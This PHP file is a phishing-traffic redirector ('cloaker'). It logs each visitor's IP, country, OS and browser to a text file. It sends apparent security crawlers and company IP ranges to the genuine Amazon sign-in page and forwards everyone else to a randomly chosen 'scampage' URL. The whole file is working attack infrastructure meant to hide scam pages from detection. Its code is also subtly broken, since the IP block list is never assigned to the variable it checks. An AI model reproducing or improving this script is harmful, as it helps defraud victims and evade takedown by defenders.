<?php
error_reporting(0);
$scampage = array(
	"https://google.com/",
        "https://amazon.com/",
            "https://msn.com/",
                "https://bbc.com/",
                    "https://wwe.com/",
	// Just add as much as much...  LINKs
);

$out = "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"; // throw
$jnck = count($scampage) - 1;
$rand = rand(0, $jnck);
$trgt = $scampage[$rand];
date_default_timezone_set('Europe/London');
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS(){
    global $user_agent;
    $os_platform    =   "Another";
    $os_array       =   array(
    	                    '/windows nt 10.0/i'    =>  'Windows 10',
    	                    '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}
function get_browser_name($user_agent)
{
    if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
    elseif (strpos($user_agent, 'Edge')) return 'Edge';
    elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
    elseif (strpos($user_agent, 'Safari')) return 'Safari';
    elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
    elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';
    
    return 'Other';
}
$user_os        =   getOS();
$user_browser   =   get_browser_name($_SERVER['HTTP_USER_AGENT']);
$from  = $_SERVER['HTTP_REFERER'];
$ip    = $_SERVER['REMOTE_ADDR'];
$getip = 'http://ip-api.com/json/' . $ip;
$curl  = curl_init();
curl_setopt($curl, CURLOPT_URL, $getip);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$details      = json_decode($content);
$countr       = $details->countryCode;
$countryname  = $details->country;
$countrycode  = strtolower($countr);
$ip = $_SERVER['REMOTE_ADDR'];
$dateTime = date("F j, Y, g:i a"); 
array("151.80.38.67","144.76.22.83","178.32.216.192","72.30.14.73","50.97.98.153","199.59.150.182","136.243.154.93","69.164.111.198","163.172.128.98","182.75.120.10","51.15.54.85","144.76.22.213","72.30.14.92","17.142.159.185","150.70.173.5","163.172.138.81","51.15.53.163","199.59.150.183","52.21.255.183","199.59.150.180","184.173.211.18","73.204.5.117","184.173.226.128","184.173.226.129","75.76.51.51","204.13.201.137","85.17.14.20","85.17.14.21","77.234.90.5","115.112.129.194","184.173.226.130","104.238.46.114","212.21.66.6","38.80.23.38","38.80.23.35","38.80.27.84","51.15.46.174","51.15.52.84","163.172.139.91","87.118.116.12","69.80.245.139","51.15.58.219","173.16.163.104","71.234.230.249","64.28.50.130","174.255.201.10","178.197.236.253","51.255.66.112","54.91.107.158","17.142.155.148","50.97.101.74","139.59.149.99","76.170.163.214","96.32.140.241","96.94.247.225","213.104.23.200","204.13.201.139","107.178.194.123","196.52.2.62","107.4.37.238","85.248.227.165","157.55.39.66","17.198.249.137","17.220.176.23","17.207.49.21","17.198.181.18","17.207.49.17","17.209.77.17","17.207.49.19","17.197.166.17","17.218.20.18","17.229.103.17","17.220.176.17","17.198.249.153","17.198.181.20","17.226.7.20","205.201.132.14","70.228.93.92","148.163.128.145","74.73.64.254","66.220.156.144","198.71.237.19","180.242.46.254","100.8.140.46","71.35.85.138","107.77.70.87","94.23.173.249","54.174.33.17","79.172.193.32","69.171.228.116","171.25.193.77","66.220.156.179","185.170.42.4","74.137.8.217","66.220.151.208","108.28.40.159","8.28.16.254","199.91.135.163","70.140.101.146","66.220.148.166","70.120.238.144","52.21.176.42","12.246.227.34","216.255.122.67","96.85.185.145","99.74.248.133","50.78.251.5","54.165.181.10","104.173.38.222", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "54.228.218.117", "^54.228.218.*", "185.28.20.243", "^185.28.20.*", "217.16.26.166", "^217.16.26.*");
if (in_array ($ip, $denyIPs)) {
	$fh = fopen('Audience.txt', 'a+');
	fwrite($fh, 'Blocked by IP =>'." $countryname / $user_os - $user_browser >> $ip | $dateTime | $from\n");
	fclose($fh);
	header("Location: $out");
	exit();
}
if(strstr($_SERVER['HTTP_USER_AGENT'],'iPod') || strstr($_SERVER['HTTP_USER_AGENT'],'iPhone') || strstr($_SERVER['HTTP_USER_AGENT'],'iPad') || strstr($_SERVER['HTTP_USER_AGENT'],'Mac OS 9') || strstr($_SERVER['HTTP_USER_AGENT'],'Mac OS X') || strstr($_SERVER['HTTP_USER_AGENT'],'Android') || strstr($_SERVER['HTTP_USER_AGENT'],'Windows') || strstr($_SERVER['HTTP_USER_AGENT'],'Mobile'))
{
	$jml = count($scampage);
	$ke = rand(0, $jml);
	$fh = fopen('Audience.txt', 'a+');
	fwrite($fh, 'Accepted =>'." $countryname / $user_os - $user_browser >> $ip | $dateTime | $from\n");
	fclose($fh);
	header('Location: '.$trgt);
	exit();
}
else {
	$fh = fopen('Audience.txt', 'a+');
	fwrite($fh, 'Blocked =>'." $countryname / $user_os - $user_browser >> $ip | $dateTime | $from\n");
	fclose($fh);
	header("Location: $out");
	exit();
}
?>
